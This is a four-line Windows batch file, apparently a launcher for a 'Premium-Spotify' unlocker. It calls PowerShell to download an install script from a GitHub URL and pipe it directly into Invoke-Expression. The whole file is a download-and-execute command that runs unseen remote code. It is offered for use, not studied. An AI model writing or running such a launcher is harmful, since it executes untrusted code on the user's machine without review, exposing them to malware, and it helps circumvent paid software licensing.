@echo off
powershell -Command "& {Invoke-WebRequest -UseBasicParsing 'https://github.com/CodingByLune/Premium-Spotify/master/install.ps1' | Invoke-Expression}"
pause
exit
